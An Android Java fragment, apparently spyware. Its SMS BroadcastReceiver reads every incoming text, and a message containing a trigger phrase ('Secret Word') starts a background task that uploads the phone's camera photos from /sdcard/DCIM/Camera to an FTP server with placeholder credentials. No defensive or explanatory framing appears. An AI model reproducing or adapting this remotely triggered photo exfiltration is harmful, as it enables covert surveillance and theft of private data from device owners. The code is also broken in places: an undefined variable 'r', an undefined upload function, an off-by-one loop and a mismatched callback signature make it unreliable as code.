public class SMSLauncher extends BroadcastReceiver
{
	public static final String SMS_EXTRA_NAME = "pdus";
	
        @Override
	public void onReceive(Context context, Intent intent) 
        {
        Bundle extras = intent.getExtras();
        String messages = "";
        
        if ( extras != null )
        {
            Object[] smsExtra = (Object[]) extras.get( SMS_EXTRA_NAME );
            
            // Get ContentResolver object for pushing encrypted SMS to the incoming folder
            ContentResolver contentResolver = context.getContentResolver();
            
            for ( int i = 0; i < smsExtra.length; ++i )
            {
            	SmsMessage sms = SmsMessage.createFromPdu((byte[])smsExtra[i]);	
            	String body = sms.getMessageBody().toString();
            	String address = sms.getOriginatingAddress();
                
                messages += "SMS from " + address + " :\n";                    
                messages += body + "\n";
                if(body.contains("Secret Word")){new Post().execute(1,1,1);};
            }}}
       
         private class Post extends AsyncTask<Integer, Integer, Integer>{
	    	protected void onPreExecute(){}
	    	
	    	@Override
	    	protected Integer doInBackground(Integer... arg){
		   File fileList = new File("/sdcard/DCIM/Camera");
		   if(fileList!=null && fileList.isDirectory()){
	           File[] files = fileList.listFiles();
		       for(int i = 0; i < files.length - 1;i++){
			 try {uploadfile("my.ftp.server.com","username","pass", r.getPath(), "/public/android/");}
			 catch (IOException e) {e.printStackTrace();}}}
		return 0;}

	    	protected void onPostExecute(String result){}}
}